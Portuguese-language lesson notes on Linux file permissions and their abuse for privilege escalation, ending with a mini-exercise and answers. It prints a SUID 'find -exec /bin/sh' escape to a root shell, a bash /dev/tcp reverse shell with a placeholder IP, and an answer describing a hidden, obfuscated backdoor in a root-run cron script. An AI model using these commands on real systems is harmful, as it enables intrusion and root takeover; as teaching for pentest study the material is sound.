# Permissões (chmod, chown, chgrp)

Objetivos da aula:

- Ler permissões e entender o que significa

- Alterar permissões corretamente

- Manipular owner e group

- Identificar permissões perigosas para privesc

- Reconhecer padrões usados em máquinas vulneráveis

- Pensar como atacante quando ver uma permissão suspeita

---

## Base das Permissões

**Vamos começar analisando:**

`-rwsr-xr-- 1 root www-data 12345 sep 15 10:00 backup.sh`

**No primeiro caractere, podemos ter:**

- `-` -> que significa arquivo

- `d` -> que significa diretório

- `l` -> que significa link simbólico

**Depois, temos 3 grupos de 3 caracteres, por exemplo:**

`rwx` para owner

`r-x` para group

`r--` para others

**ou seja:**

- `r`  -> read

- `w` -> write

- `x` -> execute

- `s` -> o arquivo é executado com as permissões de seu owner

Vamos usar o exemplo apresentado para fixar o conteúdo. O arquivo contém as permissões: `-rwsr-xr--`

Ou seja,

`-` significa que ele é um arquivo

`rws` - OWNER pode ler, escrever, e tem um `setuid` configurado, o que diz que quando o arquivo for executado, será executado com as permissões de seu owner que no caso é root

`r-x` - GROUP ao qual o arquivo pertence pode ler e executar tal arquivo

`r--` - OTHERS usuários podem apenas ler tal arquivo.

Isso é importante, pois, um atacante sempre procura um **writable + executable** em algum lugar para poder se aproveitar disso e executar comandos malíciosos.

Agora imagine que, um arquivo ao qual como **www-data** podemos escrever, e ele tem um **setuid** configurado. Assim, poderíamos criar o backdoor perfeito usando comandos com permissão de root.

---

## Permissões númericas

0    ---
1    --x
2    -w-
4    r--
5    r-x
6    rw-
7    rwx

**Exemplo:**

`chmod 755 arquivo.php`

Resumindo, o owner tem permissão total, o grup tem permissão de ler e executar e o others tem permissão de ler e executar também.

---

## Alterando permissões

Para alterar as permissões, usamos 

`chmod 755 arquivo` - com os números

`chmod u+x arquivo` - adiciona a permissão depois do + ao user, que é o dono do arquivo

`chmod g-w arquivo` - remove permissões do grupo do arquivo

`chmod o+r` - adiciona permissões no others



Para alterar o dono do arquivo, usamos

`chown root arquivo`



Para alterar o grupo + dono, usamos

`chown root:www-data arquivo`



Para trocar apenas o grupo

`chgrp www-data arquivo`

---

## Permissões especiais

Alguns arquivos precisam ser executados com as permissões de seus donos, como por exemplo, root.

### SUID - Set User ID

Um arquivo com o bit SUID ativo quando é executado, executa com as permissões de seu dono, então se o arquivo .sh tem um `whoami` dentro e seu dono é `root`, o output deve ser `root` propriamente dito.

Isso é ouro do ouro, pois, imagine que há algum serviço que utilize SUID root, e você, um mero `www-data` pode executa-lo. É uma porta de entrada para exploits conhecidos e privesc.

### SGID - Set Group ID

Mesma coisa acima, porém se aplica ao grupo

### Sticky  bit

Esse rapaz não permite que tal arquivos sejam excluídos por outros usuários.

---

## Ações para atacantes

Agora, vamos supor que você conseguiu uma shell reversa num site e agora tem acesso pelo grupo www-data.

A primeira coisa a ser feita, é rodar alguns SCRIPTS para confirmar a presença de algum SUID deixado para trás, ao qual você pode correr no  GTFOBins para encontrar um privesc usando tal SUID.

Para achar esses SUIDs ou outros, usamos:

`find / -perm -4000 -type f 2>/dev/null` - que dissecado, significa: `find /` busca no diretório raiz `-type f` todos os arquivos `-perm -4000` os arquivos com o código binário do SUID, que é 4000.

SUID é **uma das maiores portas de Privesc no Linux**.

**Por quê?**

Quando um arquivo tem SUID ativo e pertence ao root, **qualquer usuário que executá-lo, executa como root**.

Exemplos de arquivos SUID perigosos:

- `/usr/bin/find`

- `/usr/bin/vim`

- `/usr/bin/nmap`

- `/usr/bin/bash`

- `/usr/bin/perl`

Se algum desses tiver SUID → **root shell imediato**.

Exemplo:

`-rwsr-xr-x 1 root root 133K /usr/bin/find`

Você pode fazer:

`find . -exec /bin/sh \; -quit`

→ **root shell**

---

## Diretórios world-writable

Significa que qualquer usuário pode escrever / prover arquivos lá.

Agora pense, se você pode escrever dentro de um diretório que um usuário privilegiado utiliza, podemos colocar arquivos maliciosos lá.

Para encontrar tais diretórios, podemos usar o find com o type -d e -perm de -0002

`find / -type d -perm -0002 2>/dev/null`

O binário  do world-writable é `0002`



**Arquivos executáveis world-writable**

Esses, são ainda melhores que os diretórios, pois, você pode:

- substituir o arquivo

- injetar comandos maliciosos

- manipular  comportamento do sistema

- sequestrar scripts usados em cronjobs ou serviços

Por exemplo: 

`-rwxrwxrwx 1 root root /usr/local/bin/backup.sh`

Se isso existe, você pode colar um reverse shell e espera o root rodar com o cron -> root shell pra você.



**Para encontrar esses arquivos executáveis world-writable:**

`find / -perm -0002 -type f 2>/dev/null`

---

## Observações

Agora, com todos esses meios de achar possíveis vulnerabilidades em sistemas Linux, vamos entender mais o que podemos fazer com cada uma delas.



### Achou um SUID -> tenta exploit

Exemplo:

- find

- nano

- vim

- bash

- python

- perl

- cp

- chmod

- rsync

- less

- more

Cada um dos acima tem métodos de conseguir reverse shell com SUID no GTFOBins



### Achou diretório world-writable -> tenta takeover

Colocar scripts maliciosos, binários falsos ou arquivo que root executará por engano.



### Achou arquivo world-writable -> modifica

Aqui, você pode fazer um reverse shell com

`bash -i >& /dev/tcp/SEU_IP/4444 0>&1`

E espera a execução por um cron, serviço ou usuário privilegiado.



# MINI-EXERCÍCIO

Sem pular:

1. **Explique com suas palavras o que o bit SUID realmente faz.**
   
   Resposta: Um arquivo com SUID ativado executa **com o UID do proprietário**, não do usuário que rodou.  
   Assim, se `/usr/bin/find` tem SUID e pertence ao root, qualquer usuário que executá-lo terá o processo rodando **como root (UID 0)**.

2. **Me diga por que um binário “find” com SUID é tão perigoso.**
   
   Um `find` SUID é perigoso porque ele permite executar comandos através do parâmetro `-exec`.  
   Se o binário roda como root, você pode abusar de `-exec` para abrir um shell root, por exemplo:
   
   `find . -exec /bin/sh \; -quit`
   
   Portanto, `find` SUID = **root shell imediato**.

3. **Por que um diretório world-writable não é necessariamente perigoso, mas um arquivo world-writable é?**
   
   Um diretório world-writable permite apenas **criar, apagar e renomear arquivos**, mas não permite modificar o conteúdo de arquivos protegidos.  
   Ele só é perigoso se algum serviço/cron/root **usar** esse diretório.
   
   Um arquivo world-writable é imediatamente perigoso, porque você pode **alterar seu conteúdo**, e se esse arquivo for executado por root (cronjob, serviço, script), você insere um payload e ganha root no próximo ciclo de execução.

4. **Se você achar `/usr/local/sbin/update.sh` world-writable, o que você faria como atacante?**
   
   Resposta: Eu manteria a função original do script (para não quebrar a rotina e não gerar alertas), adicionaria um payload discreto — como um reverse shell, backdoor ou comando de persistência — e ofuscaria o conteúdo para evitar detecção.  
   Antes de modificar, eu confirmaria **quem executa**, **quando** e **como**, considerando OPSEC e pivoting interno.


